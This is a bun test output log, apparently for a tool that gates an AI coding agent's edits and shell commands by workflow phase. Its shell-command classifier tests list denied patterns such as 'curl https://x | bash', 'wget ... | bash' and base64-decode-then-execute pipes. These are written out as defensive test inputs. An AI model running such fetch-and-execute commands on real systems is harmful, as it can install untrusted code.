@@ -1,0 +1,442 @@
+bun test v1.3.11 (af24e281)
+
+src/commands/telemetry.test.ts:
+(pass) telemetry kpi leaf > is registered under telemetryCommand.subCommands (ac-05) [1.27ms]
+(pass) telemetry kpi leaf > run() appends ZERO telemetry — line count unchanged (ac-06) [4.58ms]
+[error] [luca] luca telemetry pr-outcome: --review-rounds must be a number (got "abc"). Run `luca telemetry pr-outcome --help` for usage.
+(pass) telemetry pr-outcome leaf — numeric validation (VAL-02) > rejects a non-numeric --review-rounds and writes nothing [0.31ms]
+
+src/init/helpers/skill-validation.test.ts:
+(pass) bundled skill markdown — structural validation > commands/ and agents/ exist with at least one .md each [0.44ms]
+(pass) bundled skill markdown — structural validation > every command markdown file has frontmatter with name + description [1.57ms]
+(pass) bundled skill markdown — structural validation > every agent markdown file has frontmatter with name + description [1.14ms]
+(pass) bundled skill markdown — structural validation > every bundled SKILL.md has frontmatter with name + description [2.03ms]
+(pass) bundled skill markdown — structural validation > no bundled skill references stale mastracode tools or paths [8.46ms]
+
+src/init/helpers/write-project-skeleton.test.ts:
+(pass) writeProjectSkeleton > creates .luca/ directory and writes state.json with pipelineStep idle [1.63ms]
+(pass) writeProjectSkeleton > state.json parses cleanly with the canonical lucaStateSchema [1.43ms]
+(pass) writeProjectSkeleton > writes config.json with lucaVersion and default oversight [0.83ms]
+(pass) writeProjectSkeleton > is idempotent: existing files are preserved on re-run [1.04ms]
+(pass) writeProjectSkeleton > with force=true, overwrites existing files [1.21ms]
+
+src/init/helpers/wire-claude-hooks.test.ts:
+(pass) wireClaudeHooks > creates settings.json with a PreToolUse stage-gate registration [0.82ms]
+(pass) wireClaudeHooks > registers the bare `luca hook stage-gate` command [0.38ms]
+(pass) wireClaudeHooks > merges into existing settings.json without clobbering [0.47ms]
+(pass) wireClaudeHooks > is idempotent — re-running does not duplicate the stage-gate entry [0.43ms]
+
+src/init/helpers/install-skills.test.ts:
+(pass) installSkills > copies commands to <claudeHome>/commands/ [3.73ms]
+(pass) installSkills > copies agents to <claudeHome>/agents/ [2.51ms]
+(pass) installSkills > copies skill directories to <claudeHome>/skills/<name>/ [2.50ms]
+(pass) installSkills > is idempotent — re-running does not duplicate or error [2.75ms]
+(pass) installSkills > preserves user-authored files not part of the install set [2.54ms]
+(pass) installSkills > replaces a dangling symlink squatting a skill directory (regression: EEXIST crash) [2.47ms]
+(pass) installSkills > replaces a symlinked destination file instead of writing through it [2.63ms]
+(pass) installSkills > overwrites existing skills with the same name (force-updates from package) [2.77ms]
+
+src/init/helpers/wire-claude-hooks.mcp.test.ts:
+(pass) mergeAntigravityMcpRegistration (pure) > golden: empty config + token → exact canonical Antigravity shape
+(pass) mergeAntigravityMcpRegistration (pure) > preserves unrelated top-level keys and sibling mcpServers entries
+(pass) mergeAntigravityMcpRegistration (pure) > idempotent: canonical output fed back with same token is a deep-equal no-op [0.01ms]
+(pass) mergeAntigravityMcpRegistration (pure) > stale-key migration: strips Claude-shape `url` from an existing entry [0.02ms]
+(pass) mergeAntigravityMcpRegistration (pure) > header preservation (Q1): keeps a custom header, sets Authorization
+(pass) mergeAntigravityMcpRegistration (pure) > token is inlined as `Bearer <token>` — never an env placeholder [0.03ms]
+(pass) mergeClaudeMcpRegistration (pure) > golden: empty config + token → exact canonical Claude SSE shape [0.05ms]
+(pass) mergeClaudeMcpRegistration (pure) > preserves unrelated top-level keys and sibling mcpServers entries [0.03ms]
+(pass) mergeClaudeMcpRegistration (pure) > idempotent: canonical output fed back with same token is a deep-equal no-op
+(pass) mergeClaudeMcpRegistration (pure) > stale-key migration: strips Antigravity-shape serverUrl/enabledTools
+(pass) mergeClaudeMcpRegistration (pure) > header preservation (Q1): keeps a custom header, sets Authorization
+(pass) mergeClaudeMcpRegistration (pure) > token is inlined as `Bearer <token>` — never an env placeholder
+(pass) wireAntigravityMcp (FS wrapper, temp HOME only) > writes canonical mcp_config.json from an injected token [0.65ms]
+
+src/write-surface/handlers/luca-workflow-reset.test.ts:
+(pass) luca_workflow_reset > rewrites state.json to defaults when confirm=true [1.88ms]
+(pass) luca_workflow_reset > removes the pipeline lock if present [1.00ms]
+(pass) luca_workflow_reset > refuses to reset when confirm is false (default) [0.47ms]
+(pass) luca_workflow_reset > creates state.json from defaults if file did not exist [0.70ms]
+(pass) luca_workflow_reset > has no allowedPhases (callable in any pipelineStep) [0.26ms]
+
+src/write-surface/handlers/luca-checks-run.test.ts:
+(pass) luca_checks_run > runs a passing command and reports passed=true [3.11ms]
+(pass) luca_checks_run > captures stderr and marks failed when exit code nonzero [4.00ms]
+(pass) luca_checks_run > times out a hanging command and kills the process [253.37ms]
+(pass) luca_checks_run > runs multiple commands sequentially and aggregates [6.86ms]
+(pass) luca_checks_run > marks overall failed when any command fails [8.63ms]
+(pass) luca_checks_run > rejects timeout_ms outside [100, 600000] [1.62ms]
+(pass) luca_checks_run > rejects empty argv [0.84ms]
+(pass) luca_checks_run > declares allowedPhases: [execute, checks] [0.75ms]
+
+src/write-surface/handlers/luca-todo-migrate.test.ts:
+(pass) luca_todo_migrate > cached root → recall_tree (dedupe) + recall (flat), re-add via add_child/forget [2.95ms]
+(pass) luca_todo_migrate > no cached root → bootstrap (remember_tree + recall), set-root instruction [1.15ms]
+(pass) luca_todo_migrate > is explicit that legacy enumeration is best-effort [0.54ms]
+(pass) luca_todo_migrate > rejects limit outside [1, 200] [0.56ms]
+(pass) luca_todo_migrate > has no allowedPhases (callable in any pipelineStep) [0.44ms]
+
+src/write-surface/handlers/luca-state-advance.test.ts:
+(pass) luca_state_advance > advances legally and writes the new step [2.59ms]
+(pass) luca_state_advance > rejects illegal jumps with isError [1.12ms]
+(pass) luca_state_advance > allows loop-back (plan-review → plan) [1.56ms]
+(pass) luca_state_advance > preserves other state fields on transition [1.38ms]
+(pass) luca_state_advance > creates state.json from defaults when missing (idle → triage) [1.23ms]
+(pass) luca_state_advance > returns from + to in result text [1.35ms]
+
+src/write-surface/handlers/luca-preferences-read.test.ts:
+(pass) luca_preferences_read > returns schema defaults when config.json is missing [0.87ms]
+(pass) luca_preferences_read > returns schema defaults when config.json has no preferences key [0.61ms]
+(pass) luca_preferences_read > returns merged values when preferences are set [1.04ms]
+(pass) luca_preferences_read > returns isError when preferences fail schema validation [2.56ms]
+(pass) luca_preferences_read > has no allowedPhases (callable in any pipelineStep) [0.53ms]
+
+src/write-surface/handlers/luca-todo-update.test.ts:
+(pass) luca_todo_update > cached root: REPLACE via recall_tree + add_child + forget (never evolve) [2.70ms]
+(pass) luca_todo_update > no cached root → bootstrap (remember_tree + add_child, set-root instruction) [1.11ms]
+(pass) luca_todo_update > rejects status=done without verificationRef [0.81ms]
+(pass) luca_todo_update > accepts status=done when verificationRef points at met PASS criterion [2.81ms]
+(pass) luca_todo_update > rejects status=done when criterion is unmet [1.06ms]
+(pass) luca_todo_update > rejects status=done when verify.json is missing [0.76ms]
+(pass) luca_todo_update > has no allowedPhases (callable in any pipelineStep) [0.28ms]
+
+src/write-surface/handlers/luca-todo-list.test.ts:
+(pass) luca_todo_list > cached root → single deterministic recall_tree (no semantic recall) [1.38ms]
+(pass) luca_todo_list > no cached root → plain "not initialized" message, NOT a doomed query [0.87ms]
+(pass) luca_todo_list > default limit is 0 (no cap — complete enumeration) [0.82ms]
+(pass) luca_todo_list > respects an explicit positive limit (deliberate truncation) [0.52ms]
+(pass) luca_todo_list > includes a status filter hint when status is supplied [0.52ms]
+(pass) luca_todo_list > rejects limit outside [0, 200] [0.37ms]
+(pass) luca_todo_list > has no allowedPhases (callable in any pipelineStep) [0.27ms]
+
+src/write-surface/handlers/luca-roadmap-read.test.ts:
+(pass) luca_roadmap_read > returns empty array when state.json is missing [0.66ms]
+(pass) luca_roadmap_read > returns roadmap entries with their statuses [0.52ms]
+(pass) luca_roadmap_read > has no allowedPhases (callable in any pipelineStep) [0.24ms]
+
+src/write-surface/handlers/luca-branch-guard.test.ts:
+(pass) luca_branch_guard > ok=true when current branch differs from default [42.73ms]
+(pass) luca_branch_guard > returns isError when current branch equals default [38.10ms]
+(pass) luca_branch_guard > default_branch schema default is "main" when omitted [37.45ms]
+(pass) luca_branch_guard > returns isError when not a git repo [4.74ms]
+(pass) luca_branch_guard > has no allowedPhases (callable in any phase) [0.27ms]
+
+src/write-surface/handlers/luca-pr-review-regression-check.test.ts:
+(pass) luca_pr_review_regression_check > returns isError when a regression is detected on a touched path [0.59ms]
+(pass) luca_pr_review_regression_check > succeeds when the iteration only resolves findings [0.23ms]
+(pass) luca_pr_review_regression_check > new finding on an untouched path is not a regression [0.20ms]
+(pass) luca_pr_review_regression_check > has no allowedPhases (callable in any pipelineStep) [0.14ms]
+
+src/write-surface/handlers/luca-state-read.test.ts:
+(pass) luca_state_read > descriptor has expected name and is allowed in all phases [0.28ms]
+(pass) luca_state_read > returns the parsed state as JSON text content [0.73ms]
+(pass) luca_state_read > returns idle defaults when state.json missing [0.24ms]
+
+src/write-surface/handlers/luca-preferences-write.test.ts:
+(pass) luca_preferences_write > writes a fresh preferences section when config.json is missing [1.09ms]
+(pass) luca_preferences_write > shallow-merges sections with existing preferences [0.84ms]
+(pass) luca_preferences_write > preserves other top-level keys in config.json [0.75ms]
+(pass) luca_preferences_write > rejects unsafe free-form values via schema [0.38ms]
+(pass) luca_preferences_write > rejects ReDoS-shaped regex in branchTypes.match [0.80ms]
+(pass) luca_preferences_write > has no allowedPhases (callable in any pipelineStep) [0.23ms]
+
+src/write-surface/handlers/luca-confidence-log.test.ts:
+(pass) luca_confidence_log > appends a single JSONL line to confidence.jsonl [1.18ms]
+(pass) luca_confidence_log > appends multiple entries preserving order [1.10ms]
+(pass) luca_confidence_log > rejects payloads missing canonical fields [0.77ms]
+(pass) luca_confidence_log > rejects invalid `confidence` enum value [0.22ms]
+(pass) luca_confidence_log > rejects invalid `category` enum value [0.22ms]
+(pass) luca_confidence_log > accepts optional reviewHint [0.94ms]
+(pass) luca_confidence_log > errors when no active phase (currentPhase=0) [0.57ms]
+(pass) luca_confidence_log > has no allowedPhases (callable in any pipelineStep) [0.15ms]
+
+src/write-surface/handlers/write-tools.test.ts:
+(pass) luca_phase_write_plan > writes .luca/phases/<slug>/plan.md with the supplied content [1.49ms]
+(pass) luca_phase_write_plan > errors when no active phase (currentPhase=0) [0.50ms]
+(pass) luca_phase_write_plan > declares allowedPhases: [plan] [0.14ms]
+(pass) luca_phase_write_research > writes .luca/phases/<slug>/research.md [1.02ms]
+(pass) luca_phase_write_research > declares allowedPhases: [research] [0.19ms]
+(pass) luca_phase_write_context > writes .luca/phases/<slug>/context.md [1.07ms]
+(pass) luca_phase_write_context > declares allowedPhases: [discuss] [0.15ms]
+(pass) luca_phase_write_audit > writes .luca/phases/<slug>/audits/<reviewer>.md [1.59ms]
+(pass) luca_phase_write_audit > declares allowedPhases: [review] [0.15ms]
+(pass) luca_phase_write_audit > input schema rejects invalid reviewer name (uppercase) [0.58ms]
+
+src/write-surface/handlers/luca-todo-set-root.test.ts:
+(pass) luca_todo_set_root > writes muninn.todoBacklog = { vault, rootId } and preserves other keys [1.10ms]
+(pass) luca_todo_set_root > records the resolved vault (defaults when config has none) [0.56ms]
+(pass) luca_todo_set_root > rejects a non-ULID id at the schema level [0.38ms]
+(pass) luca_todo_set_root > has no allowedPhases (callable in any pipelineStep) [0.26ms]
+
+src/write-surface/handlers/luca-roadmap-create.test.ts:
+(pass) luca_roadmap_create > replaces the roadmap array and updates totalPhases [1.32ms]
+(pass) luca_roadmap_create > preserves unrelated state fields [1.07ms]
+(pass) luca_roadmap_create > rejects empty phases array [0.32ms]
+(pass) luca_roadmap_create > rejects entries with missing name [0.35ms]
+(pass) luca_roadmap_create > declares allowedPhases: [idle, triage] [0.29ms]
+(pass) luca_roadmap_create > bootstraps an ABSENT state.json on a fresh workflow (idle defaults) [0.90ms]
+(pass) luca_roadmap_create > still throws on a present-but-truncated {} (corruption, not bootstrap) [0.82ms]
+
+src/write-surface/handlers/luca-phase-advance.test.ts:
+(pass) lucaPhaseAdvanceTool > advances currentPhase and updates leaving/entering statuses [1.41ms]
+(pass) lucaPhaseAdvanceTool > errors when no active phase (currentPhase=0) [0.78ms]
+(pass) lucaPhaseAdvanceTool > errors at the final phase (nothing to advance to) [0.64ms]
+
+src/write-surface/handlers/luca-phase-archive.test.ts:
+(pass) lucaPhaseArchiveTool > moves phase dirs into .luca/archive/ [2.24ms]
+(pass) lucaPhaseArchiveTool > skips a slug already present under archive/ (never overwrites) [1.83ms]
+(pass) lucaPhaseArchiveTool > no-op when .luca/phases/ is absent [1.36ms]
+(pass) lucaPhaseArchiveTool > skips a stray non-slug directory instead of throwing [2.85ms]
+
+src/write-surface/handlers/luca-todo-add.test.ts:
+(pass) luca_todo_add > fast path: cached root → single add_child with the real parent_id [1.43ms]
+(pass) luca_todo_add > bootstrap path: no cached root → remember_tree + add_child + set-root instruction [0.66ms]
+(pass) luca_todo_add > cached root for a DIFFERENT vault is ignored (re-bootstraps) [0.53ms]
+(pass) luca_todo_add > does NOT interpolate the free-form title/body into instruction text [0.52ms]
+(pass) luca_todo_add > honors an explicit id when supplied [0.52ms]
+(pass) luca_todo_add > falls back to "default" vault when config.json is missing [0.36ms]
+(pass) luca_todo_add > rejects a title that yields an empty slug [0.40ms]
+(pass) luca_todo_add > does not allow setting status=done at create time [0.33ms]
+(pass) luca_todo_add > has no allowedPhases (callable in any pipelineStep) [0.28ms]
+
+src/write-surface/handlers/phase-write-tools.test.ts:
+(pass) luca_phase_write_summary > writes execute/summary.md when pipelineStep is execute [1.39ms]
+(pass) luca_phase_write_summary > declares allowedPhases: [execute] [0.15ms]
+(pass) luca_phase_write_wave > writes execute/waves/NN.md with zero-padded wave number [1.27ms]
+(pass) luca_phase_write_wave > rejects wave number > 99 [0.29ms]
+(pass) luca_phase_write_wave > declares allowedPhases: [execute] [0.13ms]
+(pass) luca_phase_write_verify > writes verify.json with structured result object [1.79ms]
+(pass) luca_phase_write_verify > declares allowedPhases: [verify] [0.19ms]
+(pass) luca_phase_write_learn > writes learn.md when pipelineStep is learn [1.18ms]
+(pass) luca_phase_write_learn > declares allowedPhases: [learn] [0.15ms]
+(pass) luca_phase_write_plan_review > writes plan-review.md when pipelineStep is plan-review [1.03ms]
+(pass) luca_phase_write_plan_review > declares allowedPhases: [plan-review] [0.16ms]
+(pass) phase write tools — common contract > all 5 tools error when no active phase (currentPhase=0) [0.47ms]
+
+src/write-surface/handlers/luca-brain-recall-root.test.ts:
+(pass) luca_brain_recall_root > cached root → single recall_tree procedure with the real ULID (no concept) [1.02ms]
+(pass) luca_brain_recall_root > uninitialized (no cached root) → plain notice, not a query [0.63ms]
+(pass) luca_brain_recall_root > cached root recorded under a different vault is ignored [0.53ms]
+(pass) luca_brain_recall_root > rejects a non-brain concept [0.31ms]
+(pass) luca_brain_recall_root > has no allowedPhases (callable in any pipelineStep) [0.29ms]
+
+src/write-surface/handlers/luca-pr-outcome.test.ts:
+(pass) pr-outcome > round-trips a merged result [0.87ms]
+(pass) pr-outcome > round-trips the full optional field set (branch/issue/originRunId) [0.54ms]
+(pass) pr-outcome > omits absent optional fields from meta [0.66ms]
+(pass) pr-outcome > round-trips a reverted result [0.56ms]
+(pass) pr-outcome > round-trips reviewRounds [0.55ms]
+(pass) pr-outcome > round-trips timeToMergeMs [0.58ms]
+(pass) pr-outcome > writes top-level kind=pr.outcome and runId=pr-outcomes [0.51ms]
+(pass) pr-outcome > rejects an invalid result enum value [0.40ms]
+(pass) pr-outcome > rejects a payload missing a required field (prNumber) [0.17ms]
+
+src/write-surface/handlers/luca-brain-set-root.test.ts:
+(pass) luca_brain_set_root > writes muninn.brainRoots[concept] = { vault, rootId }, preserving other keys [1.46ms]
+(pass) luca_brain_set_root > keeps multiple brain trees side by side (identity + requirements) [1.17ms]
+(pass) luca_brain_set_root > rejects a non-brain concept and a non-ULID id [0.39ms]
+(pass) luca_brain_set_root > has no allowedPhases (callable in any pipelineStep) [0.56ms]
+
+src/write-surface/handlers/luca-pr-review-filter-stale.test.ts:
+(pass) luca_pr_review_filter_stale > partitions comments into actionable / stale / unknown / replies [11.69ms]
+(pass) luca_pr_review_filter_stale > handles an empty comment list [5.15ms]
+(pass) luca_pr_review_filter_stale > has no allowedPhases (callable in any pipelineStep) [0.40ms]
+
+src/write-surface/handlers/luca-repo-cleanup-apply.test.ts:
+(pass) luca_repo_cleanup_apply > refuses to act when confirm is false [0.95ms]
+(pass) luca_repo_cleanup_apply > delete action removes the file when confirmed [0.73ms]
+(pass) luca_repo_cleanup_apply > move action relocates the file and creates parent dirs [0.65ms]
+(pass) luca_repo_cleanup_apply > move action errors when target_path is missing [0.28ms]
+(pass) luca_repo_cleanup_apply > gitignore action appends the path to .gitignore [0.39ms]
+(pass) luca_repo_cleanup_apply > gitignore action is idempotent [0.35ms]
+(pass) luca_repo_cleanup_apply > refuses path traversal outside the project root [0.17ms]
+(pass) luca_repo_cleanup_apply > refuses to delete inside .git/ [0.40ms]
+(pass) luca_repo_cleanup_apply > refuses a move whose target escapes the project root [0.30ms]
+(pass) luca_repo_cleanup_apply > skips gracefully when the target file does not exist [0.17ms]
+(pass) luca_repo_cleanup_apply > has no allowedPhases (callable in any pipelineStep) [0.15ms]
+
+src/write-surface/handlers/luca-pr-review-detect-convergence.test.ts:
+(pass) luca_pr_review_detect_convergence > promotes severity when 2+ perspectives flag the same line [0.55ms]
+(pass) luca_pr_review_detect_convergence > no promotions when findings do not converge [0.19ms]
+(pass) luca_pr_review_detect_convergence > handles an empty findings list [0.16ms]
+(pass) luca_pr_review_detect_convergence > has no allowedPhases (callable in any pipelineStep) [0.12ms]
+
+src/write-surface/handlers/luca-phase-current.test.ts:
+(pass) luca_phase_current > reports active:false when currentPhase is 0 [0.76ms]
+(pass) luca_phase_current > computes slug + NN + dir for an active phase [0.64ms]
+(pass) luca_phase_current > zero-pads two-digit phase numbers [0.59ms]
+(pass) luca_phase_current > kebab-cases roadmap names with whitespace or capitals [0.49ms]
+(pass) luca_phase_current > errors when currentPhase > 99 (out of slug range) [0.50ms]
+(pass) luca_phase_current > errors when currentPhase has no matching roadmap entry [0.48ms]
+
+src/write-surface/helpers/resolve-brain-root.test.ts:
+(pass) resolveBrainRoot > returns the cached rootId when the recorded vault matches [0.66ms]
+(pass) resolveBrainRoot > ignores a cached rootId recorded under a different vault [0.47ms]
+(pass) resolveBrainRoot > returns null for a concept not in the cache [0.49ms]
+(pass) resolveBrainRoot > falls back to default vault with null root when config is missing [0.31ms]
+
+src/write-surface/helpers/resolve-backlog-root.test.ts:
+(pass) resolveBacklogRoot > returns the cached rootId when the recorded vault matches [0.79ms]
+(pass) resolveBacklogRoot > ignores a cached rootId recorded under a different vault [0.47ms]
+(pass) resolveBacklogRoot > returns rootId null when no todoBacklog is recorded [0.45ms]
+(pass) resolveBacklogRoot > falls back to the default vault with null root when config is missing [0.31ms]
+
+src/write-surface/helpers/mutate-state.test.ts:
+(pass) mutateState > serializes concurrent mutations — no lost updates [1215.80ms]
+(pass) mutateState > releases the lock after each mutation (no leftover lock file) [1.59ms]
+(pass) mutateState > strict: throws on missing state.json (does NOT write defaults) [0.77ms]
+(pass) mutateState > strict: throws on malformed state.json and does not overwrite it [0.98ms]
+(pass) mutateState > strict: rejects a present-but-incomplete {} (no silent default to idle/0) [0.95ms]
+(pass) mutateState > bootstrapIfMissing: an ABSENT file is created from the supplied base [0.93ms]
+(pass) mutateState > bootstrapIfMissing does NOT rescue a present-but-incomplete file [0.81ms]
+(pass) mutateState > creates the .luca/ lock dir when absent (workflow reset on a fresh repo) [0.96ms]
+(pass) mutateState > withStateLock runs the body and releases the lock [0.65ms]
+
+src/write-surface/helpers/build-muninn-instruction.test.ts:
+(pass) buildMuninnInstruction > emits a JSON-stringified args blob and a single-line instruction [0.09ms]
+(pass) buildMuninnInstruction > embeds free-form strings inside the JSON blob (defangs injection) [0.03ms]
+(pass) buildMuninnInstruction > preserves non-string arg values (numbers, objects, arrays) [0.01ms]
+(pass) buildMuninnProcedure > numbers steps in order and JSON-stringifies each step args [0.09ms]
+(pass) buildMuninnProcedure > keeps free-form values inside step argsJson (defangs injection) [0.03ms]
+
+src/write-surface/helpers/validate-verification-ref.test.ts:
+(pass) validateVerificationRef > returns null when criterion is met + has evidence + status=PASS [1.82ms]
+(pass) validateVerificationRef > rejects when verify.json is missing [0.96ms]
+(pass) validateVerificationRef > rejects when there is no active phase [1.01ms]
+(pass) validateVerificationRef > rejects when criterion is not present in verify.json [1.64ms]
+(pass) validateVerificationRef > rejects when criterion is met:false [2.18ms]
+(pass) validateVerificationRef > rejects when criterion has empty evidence [1.58ms]
+(pass) validateVerificationRef > rejects when parent verify status is not PASS [1.98ms]
+
+src/hook/helpers/classify-bash-command.test.ts:
+(pass) classifyBashCommand — read-only > ls → bash-readonly [0.51ms]
+(pass) classifyBashCommand — read-only > ls -la src/ → bash-readonly [1.03ms]
+(pass) classifyBashCommand — read-only > cat README.md → bash-readonly [0.06ms]
+(pass) classifyBashCommand — read-only > grep foo src/*.ts → bash-readonly [0.07ms]
+(pass) classifyBashCommand — read-only > find . -name *.ts → bash-readonly [0.06ms]
+(pass) classifyBashCommand — read-only > pwd → bash-readonly
+(pass) classifyBashCommand — read-only > head -5 file.txt → bash-readonly [0.04ms]
+(pass) classifyBashCommand — read-only > tail -100 logs.txt → bash-readonly [0.04ms]
+(pass) classifyBashCommand — read-only > wc -l src/foo.ts → bash-readonly [0.04ms]
+(pass) classifyBashCommand — read-only > git status → bash-readonly [0.02ms]
+(pass) classifyBashCommand — read-only > git status --porcelain → bash-readonly
+(pass) classifyBashCommand — read-only > git log --oneline → bash-readonly [0.02ms]
+(pass) classifyBashCommand — read-only > git diff main → bash-readonly [0.02ms]
+(pass) classifyBashCommand — read-only > git show HEAD → bash-readonly [0.03ms]
+(pass) classifyBashCommand — read-only > git branch → bash-readonly [0.01ms]
+(pass) classifyBashCommand — read-only > gh pr view 262 → bash-readonly [0.06ms]
+(pass) classifyBashCommand — read-only > gh issue view 100 → bash-readonly [0.03ms]
+(pass) classifyBashCommand — read-only > gh pr list --state=open → bash-readonly
+(pass) classifyBashCommand — read-only > bunx --bun tsc --noEmit → bash-readonly [0.01ms]
+(pass) classifyBashCommand — read-only > playwright-cli open http://localhost:3000/demo → bash-readonly [0.08ms]
+(pass) classifyBashCommand — read-only > playwright-cli screenshot --filename=.playwright-cli/uat.png → bash-readonly [0.01ms]
+(pass) classifyBashCommand — read-only > open .luca/tmp/previews/phase3-direction-1.html → bash-readonly [0.02ms]
+(pass) classifyBashCommand — read-only > open "/Users/alec/repo/.luca/tmp/previews/decision.html" → bash-readonly [0.01ms]
+(pass) classifyBashCommand — read-only > xdg-open /tmp/decision.html → bash-readonly [0.03ms]
+(pass) classifyBashCommand — read-only > start decision.html → bash-readonly [0.01ms]
+(pass) classifyBashCommand — playwright-cli output paths > --filename inside .playwright-cli/ → readonly with targetPath [0.02ms]
+(pass) classifyBashCommand — playwright-cli output paths > --filename outside artifact dir (repo root) → bash-mutate
+(pass) classifyBashCommand — playwright-cli output paths > --filename outside artifact dir (space-separated flag) → bash-mutate
+(pass) classifyBashCommand — playwright-cli output paths > --filename outside artifact dir (traversal out of artifact dir) → bash-mutate
+(pass) classifyBashCommand — playwright-cli output paths > --filename outside artifact dir (absolute path) → bash-mutate
+(pass) classifyBashCommand — playwright-cli output paths > --filename target reaches path classification (deny rules apply) [0.19ms]
+(pass) classifyBashCommand — playwright-cli output paths > redirect on a playwright-cli invocation stays mutate [0.04ms]
+(pass) classifyBashCommand — mutate > cp a b → bash-mutate
+(pass) classifyBashCommand — mutate > mv a b → bash-mutate [0.12ms]
+(pass) classifyBashCommand — mutate > rm a → bash-mutate [0.04ms]
+(pass) classifyBashCommand — mutate > mkdir foo → bash-mutate [0.04ms]
+(pass) classifyBashCommand — mutate > touch foo → bash-mutate [0.02ms]
+(pass) classifyBashCommand — mutate > ln -s a b → bash-mutate
+(pass) classifyBashCommand — mutate > sed -i s/x/y/ file → bash-mutate [0.01ms]
+(pass) classifyBashCommand — mutate > echo hi > file → bash-mutate [0.02ms]
+(pass) classifyBashCommand — mutate > cat src > /tmp/x → bash-mutate
+(pass) classifyBashCommand — mutate > cat src >> /tmp/x → bash-mutate [0.02ms]
+(pass) classifyBashCommand — mutate > cat src | tee /tmp/x → bash-mutate [0.01ms]
+(pass) classifyBashCommand — mutate > bun install → bash-mutate [0.07ms]
+(pass) classifyBashCommand — mutate > bun add lodash → bash-mutate [0.01ms]
+(pass) classifyBashCommand — mutate > bun run build → bash-mutate
+(pass) classifyBashCommand — mutate > git add . → bash-mutate
+(pass) classifyBashCommand — mutate > git checkout -b feature → bash-mutate
+(pass) classifyBashCommand — mutate > unknown-command arg → bash-mutate
+(pass) classifyBashCommand — commit > git commit -m "fix" → bash-commit [0.11ms]
+(pass) classifyBashCommand — commit > git push → bash-commit
+(pass) classifyBashCommand — commit > git push origin main → bash-commit
+(pass) classifyBashCommand — commit > git push --force → bash-commit
+(pass) classifyBashCommand — commit > gh pr create → bash-commit
+(pass) classifyBashCommand — commit > gh pr merge 1 → bash-commit
+(pass) classifyBashCommand — commit > git tag v1.0.0 → bash-commit
+(pass) classifyBashCommand — denied (always) > eval "$x" → denied (eval is always denied) [0.10ms]
+(pass) classifyBashCommand — denied (always) > eval foo → denied (eval is always denied)
+(pass) classifyBashCommand — denied (always) > curl https://x | bash → denied (curl|bash pattern)
+(pass) classifyBashCommand — denied (always) > curl https://x | sh → denied (curl|sh pattern)
+(pass) classifyBashCommand — denied (always) > wget -O - x | bash → denied (wget|bash pattern)
+(pass) classifyBashCommand — denied (always) > echo Zm9v | base64 -d | bash → denied (base64-decode-then-execute)
+(pass) classifyBashCommand — denied (always) > echo Zm9v | base64 -d | sh → denied (base64-decode-then-execute)
+(pass) classifyBashCommand — multi-stage commands > cat file && rm other → mutate (highest severity)
+(pass) classifyBashCommand — multi-stage commands > git status; git commit -m x → commit (highest severity)
+(pass) classifyBashCommand — multi-stage commands > ls; eval $X → denied (highest severity)
+(pass) classifyBashCommand — multi-stage commands > ls | grep foo → readonly (all stages safe)
+(pass) classifyBashCommand — multi-stage commands > cat file | tee /tmp/x → mutate (tee writes)
+(pass) classifyBashCommand — write target paths > cp /tmp/a src/b → mutate with target src/b
+(pass) classifyBashCommand — write target paths > cat foo > src/x.ts → mutate with target src/x.ts
+(pass) classifyBashCommand — write target paths > cp src .git/hooks/post-commit → mutate with target .git/hooks/post-commit
+(pass) classifyBashCommand — write target paths > mv .luca/state.json .luca/state.bak → mutate with target
+(pass) classifyBashCommand — edge cases > empty string → readonly (no command, no work to do)
+(pass) classifyBashCommand — edge cases > whitespace-only → readonly
+(pass) classifyBashCommand — edge cases > echo with unbalanced quote tokenizes as a benign echo
+(pass) classifyBashCommand — read-only-phase regressions > cd <dir> && cat …; echo …; sed -n … → readonly [0.69ms]
+(pass) classifyBashCommand — read-only-phase regressions > cd alone → readonly (shell navigation is not a file mutation)
+(pass) classifyBashCommand — read-only-phase regressions > luca with only flags (--help/--version) → readonly
+(pass) classifyBashCommand — read-only-phase regressions > sed -n (print) → readonly; sed -i (in-place) → mutate
+(pass) classifyBashCommand — read-only-phase regressions > awk filter → readonly; gawk -i inplace → mutate
+(pass) classifyBashCommand — read-only-phase regressions > cd does not mask a real mutation later in the chain [0.12ms]
+(pass) classifyBashCommand — read-only-phase regressions > luca verification (read-only command) is not bash-mutate [0.08ms]
+(pass) classifyBashCommand — read-only-phase regressions > luca <noun> --help / --version is read-only for any noun
+(pass) classifyBashCommand — read-only-phase regressions > `-v` (=--verbose) does NOT make a mutating luca command read-only
+
+src/hook/helpers/handle-stage-gate-hook.test.ts:
+(pass) handleStageGateHook — Phase 2 plumbing contract (preserved) > returns exit code 0 with no cwd context (defaults to IDLE)
+(pass) handleStageGateHook — Phase 2 plumbing contract (preserved) > tolerates empty stdin
+(pass) handleStageGateHook — Phase 2 plumbing contract (preserved) > tolerates malformed JSON (allows, logs warning) [0.91ms]
+(pass) handleStageGateHook — Phase 2 plumbing contract (preserved) > accepts camelCase keys [0.04ms]
+(pass) handleStageGateHook — IDLE > IDLE allows Edit on code [0.86ms]
+(pass) handleStageGateHook — IDLE > IDLE allows Bash with git commit [0.67ms]
+(pass) handleStageGateHook — PLANNING > blocks Edit on src/foo.ts (code-write disallowed in PLANNING) [0.92ms]
+(pass) handleStageGateHook — PLANNING > allows Edit on .luca/phases/01-x/plan.md [0.65ms]
+(pass) handleStageGateHook — PLANNING > blocks Bash with mutate command (cp) [0.52ms]
+(pass) handleStageGateHook — PLANNING > blocks Bash with redirect (exfiltration attempt) [0.57ms]
+(pass) handleStageGateHook — PLANNING > allows Bash with read-only command [0.50ms]
+(pass) handleStageGateHook — PLANNING > blocks Bash with git commit [0.46ms]
+(pass) handleStageGateHook — EXECUTING > allows Edit on src/foo.ts [0.51ms]
+(pass) handleStageGateHook — EXECUTING > allows Bash mutate (bun install) [0.48ms]
+(pass) handleStageGateHook — EXECUTING > blocks git commit (commits only in FINALIZING) [0.50ms]
+(pass) handleStageGateHook — EXECUTING > still blocks writes to .git/ [0.44ms]
+(pass) handleStageGateHook — REVIEWING > blocks Edit on non-audit .luca/ file (must use MCP audit tool) [0.58ms]
+(pass) handleStageGateHook — REVIEWING > allows Edit on .luca/phases/01-x/audits/code-review.md [0.51ms]
+(pass) handleStageGateHook — REVIEWING > blocks Edit on src/foo.ts (no code in REVIEWING) [0.49ms]
+(pass) handleStageGateHook — ephemeral scratch (gated step) > allows Write to an OS-temp HTML preview during learn [0.56ms]
